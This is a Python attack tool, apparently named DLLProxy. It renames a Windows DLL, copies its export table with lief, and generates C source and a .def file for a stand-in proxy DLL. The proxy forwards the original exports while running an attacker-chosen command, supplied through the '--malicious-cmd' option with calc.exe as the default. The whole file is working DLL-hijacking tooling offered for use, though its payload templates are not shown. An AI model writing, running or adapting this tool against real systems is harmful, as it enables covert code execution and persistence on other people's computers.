#!/usr/bin/python3

import argparse
import logging
import lief
import os
import templates
import random

# Logging config
logging.basicConfig(format = '\r[%(asctime)s] %(name)-20s %(levelname)-9s %(message)s')
logger = logging.getLogger('')

def randstr(n):
	charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	return ''.join([random.choice(list(charset)) for i in range(n)])


def proxy(dll_name, orig_name, malicious_cmd):

	# start!
	logger.info('proxying "%s" with "%s"' % (dll_name, orig_name))

	# rename original DLL to "orig" name
	try:
		os.rename(dll_name, orig_name)
		orig_dll = lief.parse(orig_name)
		dll_petype = orig_dll.optional_header.magic
		bitness, bitname = (64, '_AMD64_') if dll_petype == lief.PE.PE_TYPE.PE32_PLUS else (32, "_X86_")
		logger.info('input DLL is %d-bits' % bitness)

		EXPORTED_FUNCTIONS = {}
		for export in orig_dll.get_export().entries:
			isnull = False
			if export.name == '':
				isnull = True
				while export.name == '' or export.name in EXPORTED_FUNCTIONS.keys():
					export.name = randstr(8)

			EXPORTED_FUNCTIONS[export.name] = {'ord': export.ordinal, 'null': isnull}


	except Exception as e:
		logger.critical('cannot rename "%s" to "%s" (%s)' % (dll_name, orig_name, str(e)))
		return None


	with open('DllProxy\\user.h', 'w') as hFile:
		hFile.write(templates.USER_H % {'BITNESS': bitname, 'MALICIOUS_CMD': malicious_cmd, 'ORIG_NAME': orig_name})


	with open('DllProxy\\user.c', 'w') as hFile:
		FUNCTIONS = []
		for name, data in EXPORTED_FUNCTIONS.items():
			FUNCTIONS.append('void %s(char i) { fakefunc(i); fakefunc(i); return; }' % name)

		ENTRIES = []
		for name, data in EXPORTED_FUNCTIONS.items():
			if data['null']:
				ENTRIES.append('\t{%d, NULL, %s},' % (data['ord'], name))
			else:
				ENTRIES.append('\t{%d, "%s", %s},' % (data['ord'], name, name))


		hFile.write(templates.USER_C % {'FUNCTIONS': '\n'.join(FUNCTIONS),'ENTRIES': '\n'.join(ENTRIES)})


	with open('DllProxy\\library.def', 'w') as hFile:
		DLL_NAME = '.'.join(os.path.split(dll_name)[-1].split('.')[:-1])
		EXPORTS = ['\t%s\t@%d' % (name, data['ord']) for name, data in EXPORTED_FUNCTIONS.items()]
		hFile.write(templates.LIBRARY_DEF % {'DLL_NAME': DLL_NAME, 'EXPORTS': '\n'.join(EXPORTS)})


	return orig_dll


if __name__ == '__main__':

	# args definition
	ap = argparse.ArgumentParser()
	ap.add_argument('--orig', '-o', dest='orig', required=False)
	ap.add_argument('--malicious-cmd', '-m', dest='malicious_cmd', required=False, default='C:\\Windows\\System32\\calc.exe')
	ap.add_argument('--verbose', '-v', action='store_true', default=False)
	ap.add_argument('DLL')
	args = ap.parse_args()

	# handle args
	# verbosity
	logger.setLevel(logging.DEBUG if args.verbose else logging.INFO)
	logger.info('welcome to DLLProxy!')

	# original name to rename DLL to
	if args.orig:
		orig_name = args.orig
		logger.debug('original DLL name forced to "%s"' % orig_name)

	else:
		dll_name = args.DLL.split('.')[:-1]
		dll_name[-1] += '_orig'
		orig_name = '.'.join(dll_name + ['dll'])


	malicious_cmd = args.malicious_cmd.replace('\\', '\\\\')
	malicious_cmd = malicious_cmd.replace('"', '\"')
	data = proxy(args.DLL, orig_name, malicious_cmd)
